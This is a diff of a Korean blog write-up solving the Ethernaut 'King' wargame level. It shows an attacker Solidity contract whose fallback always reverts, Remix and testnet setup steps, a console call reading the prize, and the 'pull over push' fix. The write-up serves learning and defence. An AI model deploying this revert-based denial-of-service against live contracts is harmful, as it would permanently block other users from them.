@@ -66,6 +66,14 @@ contract King {
 ```
 - - -
 
+### 풀이를 위한 Setup
+[RemixIDE](https://remix.ethereum.org)를 사용한다. 
+remix 사용법은 YouTube와 google에 많이 나와있으니 최신것으로 찾아보자!
+그리고 docs를 읽어본다면 사용법을 쉽게 익힐 수 있을 것이다.
+
+한 가지 주의할 점은 Force는 remix에서 바로 deploy하는 것이 아니라 ethernauts에서 만든 instance의 주소를 가지고 addressAt을 누르면 된다.
+또한 우리는 Rinkeby Network를 사용하고 있으니 ENVIRONMENT를 "Injected Web3"를 선택해주어야 한다.
+
 ## 풀이
 이 문제에서 우리의 목표는 이 게임을 break하는 것이다. 즉 누구도 게임을 할 수 없게 만들면 된다.
 
@@ -83,23 +91,53 @@ contract AttackKing {
 
     constructor() public payable {}
     
-    //
+    // King을 attack하는 function
     function attackKing(address payable _king) public payable {
-      _king.call{value: msg.value}("");
+        // send a transaction to King contract
+        _king.call{value: msg.value}("");
     }
 
+    // revert when ether comes in or when no name function was called
     fallback() external {
         revert();
     }
 }
 ```
+위 코드를 Remix IDE에서 위 코드를 Rinkeby Network에 배포한다.
+
+우리가 King contract에서 공격할 수 있는 부분은 receive() function 밖에 없다. receive의 require 부분을 보면 prize보다 크거나 msg.sender가 owner이어야 한다. 우리는 owner가 될 수 없으니 prize보다 더 큰 값을 보내면 된다. 
+
+우선 console 창에서 공격에 필요한 정보를 얻어보자
+ctrl + shift + i를 눌러 console창을 활성화 시키자
+```javascript
+// fromWei를 사용해 현재 prize의 값을 가져온다.
+web3.utils.fromWei(await contract.prize()) // 0.001 Ether
+```
+remix로 돌아와서 0.001 Ether 보다 큰 값을 attackKing contract에 보낸다. 그럼 contract의 address가 King이 되어있을 것이다. 그리고 다른 account를 생성해 transaction을 보내본다면 revert 되는 것을 확인 할 수 있다. 아래 그림은 transaction을 보낸 후 etherscan에서 확인한 사진이다.
+![transaction_reverted_ethernaut_King](transaction_reverted_ethernaut_King.png)
+
+이후 Submit instance를 누르고 조금 기다리면 block이 mine되고, 아래와 같이 뜨며 마무리된다.
+```
+٩(- ̮̮̃-̃)۶ Well done, You have completed this level!!!
+```
+
+## Troubleshooting
+나는 중간에 Gas Limit을 초과해 transcation이 계속해서 revert되는 것을 확인했다. 처음에는 무엇 때문인지 몰랐지만 etherscan에서 transaction을 확인한 후 알 수 있었다.
+![gas_limit_failed-1](gas_limit_failed-1.png)
+![gas_limit_failed-2](gas_limit_failed-2.png)
+
+이후 transaction을 보낼때 gas limit을 높혀주니 transactino이 정상적으로 진행되었다.
+
+## 마무리
+전에 다뤘던 [DOS With Unexpected Revert 취약점](https://holyhansss.github.io/vulnerability/dos_with_unexpected_revert/dos_unexpected_revert/)과 비슷했다. 위 게시글에서도 말했듯이 이 부분은 pull over push를 사용하여 문제를 해결 할 수 있다. ethernaut 시리즈가 끝나고 pull over push와 같은 방법론들도 다뤄보도록 하겠다!
+
 
 - - -
 ## 기타 정보
 - rinkeyb network ether faucet: https://faucets.chain.link/rinkeby
 - ethernaut: https://ethernaut.openzeppelin.com/
 - remix IDE: https://remix.ethereum.org
-- selfdestruct 취약점: https://holyhansss.github.io/vulnerability/selfdestruct/selfdestruct/
+- DOS With Unexpected Revert 취약점: https://holyhansss.github.io/vulnerability/dos_with_unexpected_revert/dos_unexpected_revert/
 
 ```toc
 
